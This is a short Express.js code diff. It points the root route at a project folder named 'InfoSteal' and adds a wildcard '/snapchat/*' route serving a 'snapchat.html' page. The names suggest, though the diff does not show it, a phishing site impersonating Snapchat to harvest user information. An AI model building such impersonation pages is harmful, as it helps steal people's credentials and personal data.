@@ -110,12 +110,11 @@ app.use(function(req, res, next) {
 app.use(express.static(__dirname + '/web'));
 
 app.get('/', function(req, res) {
-    res.sendFile('web/index.html');
+    res.sendFile('/home/ubuntu/InfoSteal/web/index.html');
 });
 
-app.get('/test', function(req, res){
-  res.send("Hello!")
-  console.log(req.connection)
+app.get('/snapchat/*', function(req, res){
+  res.sendFile('/home/ubuntu/InfoSteal/web/snapchat.html')
 })
 
 
